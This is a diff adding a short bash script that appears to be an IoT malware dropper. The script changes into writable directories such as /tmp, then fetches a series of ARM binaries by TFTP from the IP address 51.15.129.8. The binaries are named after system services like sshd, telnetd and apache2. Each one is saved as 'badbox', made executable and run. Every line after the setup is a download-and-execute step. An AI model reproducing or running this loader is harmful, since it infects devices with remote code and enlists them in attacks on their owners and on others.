@@ -1,0 +1,16 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexntpd;cat armexntpd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexsshd;cat armexsshd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexopenssh;cat armexopenssh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexbash;cat armexbash >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armextftp;cat armextftp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexwget;cat armexwget >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexcron;cat armexcron >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexftp;cat armexftp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexpftp;cat armexpftp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexsh;cat armexsh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexnut;cat armexnut >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armexapache2;cat armexapache2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.129.8 -c get armextelnetd;cat armextelnetd >badbox;chmod +x *;./badbox
